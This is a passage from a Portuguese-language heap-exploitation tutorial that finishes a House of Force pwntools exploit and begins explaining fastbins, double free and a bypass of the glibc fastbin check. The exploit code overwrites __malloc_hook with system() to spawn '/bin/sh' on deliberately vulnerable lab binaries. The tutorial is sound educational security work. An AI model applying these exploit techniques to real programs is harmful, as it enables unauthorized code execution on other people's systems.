</span><span class="n">distance</span> <span class="o">=</span> <span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__malloc_hook</span> <span class="o">-</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span>

<span class="c1"># solicitando um chunk do tamanho da distancia e preenchendo
</span><span class="n">malloc</span><span class="p">(</span><span class="n">distance</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span>

<span class="c1"># sobrescrevendo a malloc hook
</span><span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">))</span>
<span class="c1">#=========================================#
</span></code></pre></div></div>

<p>Além disso, qualquer argumento passado para a <code class="language-plaintext highlighter-rouge">malloc()</code> também será passado para <code class="language-plaintext highlighter-rouge">system()</code>. Isso significa que podemos “mascarar” o endereço da nossa string “/bin/sh” até mesmo como tamanho da nossa requisição (“size” na execução do programa).</p>

<p>Neste caso, como temos o vazamento do endereço da <em>heap</em>, podemos escrever a string “/bin/sh” diretamente em um <em>chunk</em>. Seguindo este raciocínio, nossa segunda requisição, que manda somente um “A” pode ser substituída pelo “/bin/sh” seguido de um <em>null byte</em> <code class="language-plaintext highlighter-rouge">\\0</code>.<br />
Em seguida, podemos fazer a quarta requisição, que apontará para a <code class="language-plaintext highlighter-rouge">heap + 0x30</code> que é o atual endereço da <code class="language-plaintext highlighter-rouge">system()</code>. O bloco final ficará desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># sobrescrevendo o top chunk size field
</span><span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">))</span>

<span class="c1"># calculando distancia entre a __malloc_hook e o top chunk
</span><span class="n">distance</span> <span class="o">=</span> <span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__malloc_hook</span> <span class="o">-</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span>

<span class="c1"># solicitando um chunk do tamanho da distancia e preenchendo com "/bin/sh"
</span><span class="n">malloc</span><span class="p">(</span><span class="n">distance</span><span class="p">,</span> <span class="sa">b</span><span class="s">"/bin/sh</span><span class="se">\0</span><span class="s">"</span><span class="p">)</span>

<span class="c1"># sobrescrevendo a malloc hook
</span><span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">))</span>

<span class="c1"># criando variável que aponta para a system()
</span><span class="n">shell</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">+</span> <span class="mh">0x30</span>

<span class="c1"># solicitando o chunk que executa "/bin/sh"
</span><span class="n">malloc</span><span class="p">(</span><span class="n">shell</span><span class="p">,</span> <span class="sa">b</span><span class="s">""</span><span class="p">)</span>
<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Agora, quando executamos nosso script, fora do GDB, em condições de produção, a última solicitação de <em>chunk</em> irá executar <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_73.png" alt="Shell obtido" /></p>

<p>Existe outra alternativa para obter o <em>shell</em>, pois a string “/bin/sh” já existe dentro da GLIBC. A razão disso, é porque funções como <code class="language-plaintext highlighter-rouge">system()</code> já fazem o equivalente a executar “/bin/sh” via <code class="language-plaintext highlighter-rouge">syscall execve</code> que também é utilizada para executar um comando passado pelo programa. Podemos substituir a linha de comando que contém a <em>string</em> “/bin/sh” pelo endereço da mesma <em>string</em> dentro da GLIBC, ficando desta forma: <code class="language-plaintext highlighter-rouge">shell = next(libc.search(b"/bin/sh"))</code>. Ao executarmos o script novamente, temos o mesmo resultado, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_74.png" alt="Shell obtido de forma alternativa" /></p>

<blockquote>
  <p>Em resumo, utilizamos a técnica <code class="language-plaintext highlighter-rouge">The house of Force</code> para sobrescrever o <em>top chunk size field</em> com o maior valor possível. Então fizemos uma nova requisição com o tamanho da distância entre a <em>heap</em> e a <em>malloc hook</em> no <em>data section</em> da própria GLIBC. A próxima requisição, sobrescreveu o <em>malloc hook</em> com o endereço da função <code class="language-plaintext highlighter-rouge">system()</code> também da própria GLIBC. Então fizemos uma requisição final com o endereço do comando que gostariamos que a <code class="language-plaintext highlighter-rouge">system()</code> executasse, mascarado no argumento <code class="language-plaintext highlighter-rouge">size</code> da malloc. A chamada para malloc se tornou <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code> nos dando uma <em>shell</em> no SO.</p>
</blockquote>

<h1 id="fastbin-dup">FASTBIN DUP</h1>

<p>Assim como no experimento anterior, vamos utilizar um binário propositalmente vulneráveil a fim de entender o funcionamento desta vulnerabilidade.</p>

<p><code class="language-plaintext highlighter-rouge">Fastbin dup</code>, ou “<em>fastbin duplicate</em>”, é uma técnica de exploração que se aproveita da função <code class="language-plaintext highlighter-rouge">free()</code> da malloc. porém, antes de iniciar a exploração, é necessário entender o conceito de <code class="language-plaintext highlighter-rouge">fastbin</code>.</p>

<h2 id="fastbins">Fastbins</h2>

<p>Além da alocação dinâmica de memória, algo que a malloc faz com eficiência é reciclar a memória <em>heap</em>, e esta é a finalidade da segunda função da malloc que iremos explorar, a <code class="language-plaintext highlighter-rouge">free()</code>.</p>

<p>A <code class="language-plaintext highlighter-rouge">free()</code> é outra função simples que necessita de somente um argumento, o apontador para o <em>chunk</em> que não é mais necessário para a execução do programa.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_75.png" alt="Estrutura da free()" /></p>

<p>Da perspectiva da malloc, um <em>chunk</em> que não é mais necessário é ligado a uma lista de <em>chunks</em> livres. Esta coleção de listas que tem como interesse na técnica <code class="language-plaintext highlighter-rouge">fastbin dup</code> é chamada de <code class="language-plaintext highlighter-rouge">fastbins</code>.</p>

<blockquote>
  <p><code class="language-plaintext highlighter-rouge">Fast</code>, pois os <em>chunks</em> nestas listas são reciclados de forma rápida e <code class="language-plaintext highlighter-rouge">bins</code>, porque é desta forma que a malloc chama os objetos de manutenção das listas.</p>
</blockquote>

<p>Os fastbins são pequenas coleções de <em>chunks</em> livres que são ligados de forma não circular, onde cada lista suporta <em>chunks</em> de tamanhos específicos.</p>

<p>Para entendermos de forma prática o comportamento dos <em>fastbins</em>, vamos debugar um binário em tempo de execução.</p>

<h3 id="analisando-o-comportamento-em-tempo-de-execução-1">Analisando o comportamento em tempo de execução</h3>

<p>Neste experimento, vamos utilizar basicamente as mesmas ferramentas anteriores, que são:</p>

<ul>
  <li>GDB (GNU Debugger)</li>
  <li>O plugin PWNDBG (encontrado em <a href="https://github.com/pwndbg/pwndbg">github.com/pwndbg/pwndbg</a>)</li>
  <li>O binário “fastbin” encontrado no material auxiliar deste paper</li>
</ul>

<p>Dentro do diretório dos binários, vamos iniciar o programa com o GDB e mudar o contexto para o código através do comando <code class="language-plaintext highlighter-rouge">set context-sections code</code>, inserir um <em>breakpoint</em> na função <code class="language-plaintext highlighter-rouge">main()</code> com o comando <code class="language-plaintext highlighter-rouge">b main</code>, e executar o programa com o comando <code class="language-plaintext highlighter-rouge">r</code>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_76.png" alt="Iniciando o programa no GDB" /></p>

<p>A primeira coisa que podemos observar, é que a primeira ação do programa é requisitar três <em>chunks</em> com o tamanho mínimo. Podemos passar a quantidade de linhas que desejamos executar, como argumento do comando <code class="language-plaintext highlighter-rouge">next</code>, então <code class="language-plaintext highlighter-rouge">n 3</code> irá fazer estas requisições.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_77.png" alt="Executando os 3 primeiros comandos" /></p>

<p>Ao visualizarmos a <em>heap</em> com o comando <code class="language-plaintext highlighter-rouge">vis</code>, podemos observar que tudo foi feito de forma normal, conforme esperado, tendo 3 <em>chunks</em> com o tamanho mínimo de 24 bytes em <em>user data</em>, os chunks a, b, e c.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_78.png" alt="Visualizando os chunks" /></p>

<p>O painel de código nos mostra que os três próximos passos utilizam a função <code class="language-plaintext highlighter-rouge">free()</code> para reciclar os mesmos chunks na mesma ordem em que foram requisitados. Antes de continuar o fluxo, vamos checar os <em>fastbins</em> com o comando <code class="language-plaintext highlighter-rouge">fastbins</code>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_79.png" alt="Fastbins" /></p>

<p>A saída do comando nos mostra que existem sete <em>fastbins</em>, cada um é responsável por armazenar <em>chunks</em> livres com tamanhos específicos entre <code class="language-plaintext highlighter-rouge">0x20</code> e <code class="language-plaintext highlighter-rouge">0x80</code> bytes. Embora existam <em>chunks</em> de tamanhos diferentes, estes são os tamanhos utilizados em condições padrão.<br />
O byte nulo <code class="language-plaintext highlighter-rouge">0x0</code> à direita de cada um, indica que estão vazios.</p>

<p>Vamos utilizar o comando <code class="language-plaintext highlighter-rouge">next</code>, seguido do comando <code class="language-plaintext highlighter-rouge">vis</code>, seguido do comando <code class="language-plaintext highlighter-rouge">fastbins</code> para visualizarmos as mudanças ocorridas.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_80.png" alt="Reciclando o primeiro chunk" /></p>

<p>Podemos observar que o <em>chunk</em> “a”, foi ligado ao <em>fastbin</em> de <code class="language-plaintext highlighter-rouge">0x20</code> bytes, lembrando que a malloc endereça seus <em>chunks</em> pelos seus metadados, e não pelo <em>user data</em>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_81.png" alt="Link no fastbin" /></p>

<p>Porém, não é possível identificar na saída do comando, nenhuma alteração na estrutura da <em>heap</em>, portanto a origem desta informação que o PWNDBG nos mostra vem de outro lugar.</p>

<p>As <code class="language-plaintext highlighter-rouge">arenas</code> são estruturas nas quais a malloc mantém todos os metadados armazenados das <em>heaps</em>, consistindo primordialmente dos cabeçalhos das listas de <em>chunks</em> livres. Uma única arena pode administrar multiplos <em>heaps</em>, e uma arena é criada durante a criação da primeira <em>heap</em>, ou seja, toda vez que um programa utiliza a malloc pela primeira vez.</p>

<p>A função <code class="language-plaintext highlighter-rouge">main()</code> de um programa, recebe uma arena especial chamada de <code class="language-plaintext highlighter-rouge">main arena</code>, que reside no <em>data section</em> da própria GLIBC. E é da <code class="language-plaintext highlighter-rouge">main arena</code> que o PWNDBG captura as informações atuais dos <em>fastbins</em>.</p>

<p>Com o PWNDBG, é possível obtermos informações diretamente da <code class="language-plaintext highlighter-rouge">main arena</code>. Com o comando <code class="language-plaintext highlighter-rouge">dq &amp;main_arena 20</code>, podemos fazer o <em>dump</em> dos vinte primeiros <em>quadwords</em> da <code class="language-plaintext highlighter-rouge">main arena</code>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_82.png" alt="20 quadwords da main arena" /></p>

<p>Se compararmos com as imagens anteriores, vemos que o <em>quadword</em> ressaltado na imagem abaixo, representa o <em>pointer</em> para o <em>top chunk</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_83.png" alt="Top chunk pointer" /></p>

<p>Ele rastreia o endereço do <em>top chunk</em> na própria arena, do qual indiretamente manipulamos na técnica <code class="language-plaintext highlighter-rouge">The House of Force</code>.<br />
A parte ressaltada na imagem abaixo, contém o cabeçalho do <em>fastbin</em> <code class="language-plaintext highlighter-rouge">0x20</code>, que neste momento contém o endereço do <em>chunk</em> “a”.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_84.png" alt="Endereço do fastbin" /></p>

<p>Toda vez que um chunk é enviado para o <em>fastbin</em>, seu endereço é escrito no cabeçalho do respectivo <em>fastbin</em> na arena.<br />
Se nós liberassemos com a função <code class="language-plaintext highlighter-rouge">free()</code> um <em>chunk</em> com o tamanho de <code class="language-plaintext highlighter-rouge">0x30</code> bytes, seu endereço seria escrito na parte ressaltada da imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_85.png" alt="Endereço do fastbin" /></p>

<p>Um <em>chunk</em> liberado com o tamanho de <code class="language-plaintext highlighter-rouge">0x40</code> bytes teria seu endereço gravado na arena na posição mostrada na imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_86.png" alt="Endereço do fastbin" /></p>

<p>E assim por diante…</p>

<p>Agora podemos avançar a execução do programa com os comandos <code class="language-plaintext highlighter-rouge">next</code>, <code class="language-plaintext highlighter-rouge">vis</code> e <code class="language-plaintext highlighter-rouge">fastbins</code> para verificarmos o comportamento.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_87.png" alt="Avançando a execução" /></p>

<p>Agora podemos observar que o <em>fastbin</em> <code class="language-plaintext highlighter-rouge">0x20</code> armazena dois <em>chunks</em>, o <em>chunk</em> “a” e o <em>chunk</em> “b” ressaltados na imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_88.png" alt="Comportamento do fastbin" /></p>

<p>Como podemos observar, o <em>fastbin</em> possui somente um “compartimento” por tamanho de <em>chunk</em>, empilhando os <em>chunks</em> pela ordem de sua liberação. Se utilizarmos o comando <code class="language-plaintext highlighter-rouge">!dq</code>, veremos o cabeçalho armazenado na arena agora pertence ao <em>chunk</em> “b”, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_89.png" alt="Arena" /></p>

<p>Isto ocorre, pois o restante dos metadados do chunk <code class="language-plaintext highlighter-rouge">0x20</code>, são guardados na própria <em>heap</em>, na imagem abaixo, podemos ver que o primeiro <em>quadword</em> do <em>user data</em> do <em>chunk</em> “b”, foi reaproveitado como um <em>forward pointer</em> ou “fd” apontando para o endereço do chunk “a”.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_90.png" alt="Fd no chunk b" /></p>

<p>Enquanto que o “fd” do <em>chunk</em> “a” é nulo, indicando que se trata do final da lista do <em>fastbin</em>.</p>

<p>O campo <em>user data</em> dos <em>chunks</em> pode ser reaproveitado desta forma, porque por padrão, os <em>chunks</em> só podem ser liberados quando não estão mais em uso pelo programa.</p>

<p>O comando <code class="language-plaintext highlighter-rouge">next</code> para liberar um novo <em>chunk</em>, seguido de <code class="language-plaintext highlighter-rouge">vis</code>, seguido de <code class="language-plaintext highlighter-rouge">fastbins</code> e por fim <code class="language-plaintext highlighter-rouge">!dq</code>, nos mostra que todo o processo se repete, toda vez que um <em>chunk</em> do mesmo tamanho é liberado, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_91.png" alt="Liberando o terceiro chunk" /></p>

<p>O <em>chunk</em> “c” agora é o primeiro <em>chunk</em> na <em>fastbin</em> de <code class="language-plaintext highlighter-rouge">0x20</code> bytes, com seu endereço escrito no cabeçalho da <code class="language-plaintext highlighter-rouge">main arena</code>. O primeiro <em>quadword</em> do <em>user data</em> do <em>chunk</em> “c” foi reaproveitado como um “fd” que aponta para o endereço do <em>chunk</em> “b”, o <em>chunk</em> “b” contém um “fd” que aponta para o <em>chunk</em> “a” e o “fd” do <em>chunk</em> “a” é nulo, indicando o fim da lista.</p>

<p>De forma abstrata, quando temos os <em>chunks</em> “a”, “b” e “c” alocados, temos um cenário mostrado como na imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_92.png" alt="Chunks alocados" /></p>

<p>Quando liberamos o <em>chunk</em> “a” com a função <code class="language-plaintext highlighter-rouge">free()</code>, seu “fd” se torna nulo e seu endereço é escrito no <em>fastbin</em> de <code class="language-plaintext highlighter-rouge">0x20</code> bytes na <code class="language-plaintext highlighter-rouge">main arena</code>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_93.png" alt="Primeiro chunk liberado" /></p>

<p>Quando o <em>chunk</em> “b” é liberado, seu “fd” aponta para o <em>chunk</em> “a” e seu endereço é escrito no <em>fastbin</em> de <code class="language-plaintext highlighter-rouge">0x20</code> bytes na <code class="language-plaintext highlighter-rouge">main arena</code>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_94.png" alt="Segundo chunk liberado" /></p>

<p>Por fim, quando o <em>chunk</em> “c” é liberado, seu “fd” aponta para o <em>chunk</em> “b” e seu endereço é escrito no <em>fastbin</em> de <code class="language-plaintext highlighter-rouge">0x20</code> bytes na <code class="language-plaintext highlighter-rouge">main arena</code>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_95.png" alt="Terceiro chunk liberado" /></p>

<p>Outra forma de visualizar os <em>fastbins</em> diretamente na <code class="language-plaintext highlighter-rouge">main arena</code>, é interpretarmos como uma simples <em>stack</em>. O <em>stack pointer</em> para cada é armazenado na arena. Toda vez que um <em>chunk</em> de tamanho de <code class="language-plaintext highlighter-rouge">0x20</code> bytes é liberado, é adicionado ao topo da <em>stack</em> de <code class="language-plaintext highlighter-rouge">0x20</code> bytes, conforme ilustrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_96.png" alt="Stack do fastbin" /></p>

<p>Esta analogia é apropriada, pois os <em>fastbins</em> na arena possuem a estritura <code class="language-plaintext highlighter-rouge">LIFO</code> (<em>Last In First Out</em>), desta forma, quando o próximo <em>chunk</em> é liberado, ele entra na <em>stack</em> e fica no topo e será o primeiro a ser reutilizado na próxima chamada de <code class="language-plaintext highlighter-rouge">malloc()</code>, conforme ilustrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_97.png" alt="Stack do fastbin" /></p>

<p>Podemos confirmar este comportamento, utilizando o comando <code class="language-plaintext highlighter-rouge">next 3</code> no PWNDBG, que executará três novas requisições à malloc, os <em>chanks</em> “d”, “e” e “f”, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_98.png" alt="Solicitando 3 novos chunks" /></p>

<p>Podemos utilizar os comandos <code class="language-plaintext highlighter-rouge">print d</code>, <code class="language-plaintext highlighter-rouge">print e</code> e <code class="language-plaintext highlighter-rouge">print f</code> para confirmar que a malloc alocou o ultimo <em>chunk</em> liberado, o <em>chunk</em> “c”, seguido dos <em>chunks</em> “b” e “a” do topo da <em>stack</em> <em>fastbin</em> ao invés de utilizar mais memória do <em>top chunk</em>, conforme mostrado na imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_99.png" alt="Chunks realocados" /></p>

<blockquote>
  <p>Em resumo, os fastbins são coleções de listas de <em>chunks</em> livres que armazenam <em>chunks</em> de acordo com seu tamanho. Elas possuem a estrutura LIFO que funcionam como uma simples <em>stack</em>. O cabeçalho de cada <em>fastbin</em> é armazenado na arena, mas os links entre os <em>chunks</em> em uma <em>fastbin</em>, é armazenado no <em>user data</em> de cada <em>chunk</em> dentro da própria <em>heap</em>.<br />
Quando uma requisição de alocação de memória é feita, a malloc irá procurar primeiramente um <em>chunk</em> apropriado que esteja dentro da <em>fastbin</em> antes de tentar alocar esta memória do <em>top chunk</em>.</p>
</blockquote>

<h2 id="enumerando-o-binário">Enumerando o binário</h2>

<p>Assim como na exploração com a técnica <code class="language-plaintext highlighter-rouge">The house of Force</code>, o primeiro objetivo da exploração do <code class="language-plaintext highlighter-rouge">Fastbin Dup</code> é sobrescrever dados em seções do binário.</p>

<p>No diretório “fastbin_dup” no material de apoio, é possível encontrar o binário também chamado “fastbin_dup”. Vamos executá-lo através do GDB e enumerá-lo com o comando <code class="language-plaintext highlighter-rouge">checksec</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_100.png" alt="Enumerando o binário" /></p>

<p>Podemos observar que este binário foi compilado com <code class="language-plaintext highlighter-rouge">Full RELRO</code>, <code class="language-plaintext highlighter-rouge">Stack Canaries</code> e <code class="language-plaintext highlighter-rouge">NX</code> habilitados. Também podemos observar que o binário não possui <code class="language-plaintext highlighter-rouge">PIE Protector</code> e a GLIBC que utiliza é a versão <code class="language-plaintext highlighter-rouge">2.30</code>, versão esta, superior a do ultimo binário explorado.</p>

<p>Executando o programa sem configurar nenhum <em>breakpoint</em>, vemos um endereço da <code class="language-plaintext highlighter-rouge">libc</code> “vazado”, porém nenhum endereço da <em>heap</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_101.png" alt="Executando o programa" /></p>

<p>O programa solicita um “<em>username</em>” para dar continuidade, vamos preecnher com qualquer dado por agora. Após preencher o <em>username</em>, somos levados ao menu que já é familiar, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_102.png" alt="Menu do programa" /></p>

<p>A opção um, nos permite alocar até sete <em>chunks</em> e nos pede o tamanho que desejamos alocar, porém, quando tentamos alocar um valor alto, o programa nos responde uma mensagem informando que o maior <em>chunk</em> que podemos alocar, deve ter no máximo 120 bytes, ou seja <code class="language-plaintext highlighter-rouge">0x80</code> bytes, que é o maior <em>chunk</em> por padrão dos <em>fastbins</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_103.png" alt="Mensagem de resposta" /></p>

<p>Vamos solicitar um <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x30</code> bytes de <em>user data</em>, que pode ser um número entre 25 e 47 bytes. O programa vai solicitar os dados para preencher o <em>chunk</em>, vamos preencher com mais dados “lixo”, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_104.png" alt="Requisitando um chunk" /></p>

<p>Agora podemos pausar o GDB e utilizar o comando <code class="language-plaintext highlighter-rouge">vis</code>, para inspecionar a <em>heap</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_105.png" alt="Inspecionando a heap" /></p>

<p>Tudo exatamente conforme esperado, temos um <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x30</code> bytes, nossos “A” preenchendo o <em>user data</em> seguido do <em>top chunk</em>. Podemos continuar a execução do programa com o comando <code class="language-plaintext highlighter-rouge">continue</code> para visualizar o menu novamente.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_106.png" alt="Continuando a execução" /></p>

<p>A opção dois, nos permite liberar um <em>chunk</em>, informando seu índice começando em 0, vamos liberar nosso primeiro <em>chunk</em> conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_107.png" alt="Liberando um chunk" /></p>

<p>Agora podemos pausar o GDB e checar a <em>heap</em> com o comando <code class="language-plaintext highlighter-rouge">vis</code> e os <em>fastbins</em> com o comando <code class="language-plaintext highlighter-rouge">fastbins</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_108.png" alt="Checando heap e fastbins" /></p>

<p>Comforme podemos observar, o <em>chunk</em> foi vinculado ao <em>fastbin</em> de <code class="language-plaintext highlighter-rouge">0x30</code> bytes e seu primeiro <em>quadword</em> do <em>user data</em> foi destinado ao “<em>forward pointer</em>”, que nesse caso é nulo por se tratar do primeiro <em>chunk</em>. Se contnuarmos a execução, veremos que a opção três, imprime o <em>target</em>, assim como no binário anterior. Assim como antes, o primeiro objetivo desta exploração, é sobrescrever estes dados, porém com uma nova técnica.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_109.png" alt="Continuando a execução" /></p>

<p>Desta vez, o <em>target</em> faz parte de uma estrutura chamada “<em>user</em>” que também armazena o “username” que fornecemos anteriormente. Podemos confirmar, pausando o GDB novamente e inserindo o comando <code class="language-plaintext highlighter-rouge">print user</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_110.png" alt="Estrutura &quot;user&quot;" /></p>

<p>Podemos obter mais informações sobre uma estrutura com o comando <code class="language-plaintext highlighter-rouge">ptype</code> para inspecioná-la, isso nos mostra qua o programa aloca 16 bytes para “username” e “target”.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_111.png" alt="Inspecionando a estrutura" /></p>

<p>Também podemos visualizar o <em>layout</em> em memória com o comando <code class="language-plaintext highlighter-rouge">dq</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_112.png" alt="Layout em memória" /></p>

<p>Este <em>layout</em> nos mostra os endereços do “username” e “target”.</p>

<h2 id="entendendo-a-fastbin-dup">Entendendo a Fastbin Dup</h2>

<p>Este binário possui uma vulnerabilidade conhecida como <code class="language-plaintext highlighter-rouge">double free</code>, isso ocorre quando um programa consegue liberar um <em>chunk</em> que já está livre, isso pode não parecer danoso, mas vamos olhar pela perspectiva do efeito que isso causa.</p>

<p>Se nós liberarmos um <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x30</code> bytes de tamanho, duas vezes, ele também estará relacionado com o <em>fastbin</em> <code class="language-plaintext highlighter-rouge">0x30</code> duas vezes, por conta disso, ele pode ser alocado por dois processos diferentes simultâneamente.</p>

<p>Por exemplo, ele pode ser alocado para armazenar dados sensíveis, como a <em>hash</em> de uma senha, depois alocado novamente do mesmo <em>fastbin</em>, para armazenar dados que o usuário tem controle, o que pode permitir que o usuário seja capaz de ler ou sobrescrever aquele dado sensível.</p>

<p>Vamos tentar liberar duas vezes o mesmo chunk de <code class="language-plaintext highlighter-rouge">0x30</code> bytes no programa. Para isso, vamos inserir qualquer valor em “username”, requisitar um chunk de <code class="language-plaintext highlighter-rouge">0x30</code> bytes e liberá-lo duas vezes, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_113.png" alt="Erro ao tentar o double free" /></p>

<p>Conforme podemos observar, algo deu errado e o binário foi parado e recebeu o <code class="language-plaintext highlighter-rouge">SIGABRT</code>, para abortar a execução.</p>

<p>Este sinal não é normal em uma execução, e se ocorreu, é porque provavelmente acionamos uma mitigação de <em>heap exploit</em> na GLIBC. Para saber mais sobre a mitigação que acionamos, podemos utilizar o comando <code class="language-plaintext highlighter-rouge">frame</code>, ou simplesmente <code class="language-plaintext highlighter-rouge">f</code>, para exibir os <em>frames</em> seguido do índice do <em>frame</em> que queremos ver, os índices estão expostos na própria tela do PWNGDB, no bloco <code class="language-plaintext highlighter-rouge">BACKTRACE</code>, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_114.png" alt="Bloco do backtrace" /></p>

<p>Neste caso, queremos ver o <em>frame</em> que indica a função <code class="language-plaintext highlighter-rouge">_int_free()</code>. Esta função é o nome da parte do procedimento que faz a checagem do <em>double free</em>. Para visualizarmos as linhas de código da GLIBC que contém esta função, podemos utilizar o comando <code class="language-plaintext highlighter-rouge">f 4</code>, onde 4 é o índice mostrado no painel, seguido de <code class="language-plaintext highlighter-rouge">context code</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_115.png" alt="Linhas de código da mitigação" /></p>

<p>A mitigação é explicada no comentário contido no código “<em>Check that the top of the bin is not the record we are going to add (i.e., double free).</em>”.</p>

<p>Esta é uma das muitas mitigações de <em>heap exploitation</em> contidas na GLIBC. A maior parte dos alocadores de memória do próprio Linux possui várias mitigações, como a GLIBC existe a tanto tempo quanto, também possui suas próprias implementações de mitigação.</p>

<p>Esta mitigação em particular, existe para impedir um <em>chunk</em> de ser liberado duas vezes na <em>fastbin</em>, e se for acionado, a mensagem de erro que recebemos é impressa em tela, e o programa recebe o sinal para abortar.</p>

<p>Quando nos deparamos com alguma mitigação como esta, a primeira coisa que precisamos experimentar, é alguma forma de fazer o <em>bypass</em>.</p>

<p>Olhando para o código, podemos identificar o que a função está procurando. O comando diz que quando o topo da <em>fastbin</em>, ou seja, o valor da <em>fastbin</em> que está na arena, é o mesmo que está sendo adicionado com a função <code class="language-plaintext highlighter-rouge">free()</code>, então um <em>double free</em> está acontecendo. Os comandos <code class="language-plaintext highlighter-rouge">vis</code> e <code class="language-plaintext highlighter-rouge">fastbins</code> nos mostram que nosso chunk de <code class="language-plaintext highlighter-rouge">0x30</code> bytes está presente no topo da <em>fastbin</em> de <code class="language-plaintext highlighter-rouge">0x30</code> bytes quando tentamos liberá-lo pela segunda vez. Mas e se houver um <em>chunk</em> diferente no topo da <em>fastbin</em> quando tentarmos utilizar o <em>double free</em>?</p>

<p>Aparentemente no código da mitigação, não existe uma tratativa para este cenário. Para testarmos esta hipótese, vamos criar um script <code class="language-plaintext highlighter-rouge">arbitrary_write.py</code> com a seguinte base:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># configurando o binario e a GLIBC
</span><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"fastbin_dup"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">runpath</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"/libc.so.6"</span><span class="p">)</span> 

<span class="c1"># GDB config
</span><span class="n">gs</span> <span class="o">=</span> <span class="s">'''
continue
'''</span>

<span class="c1"># funcao para iniciar
</span><span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
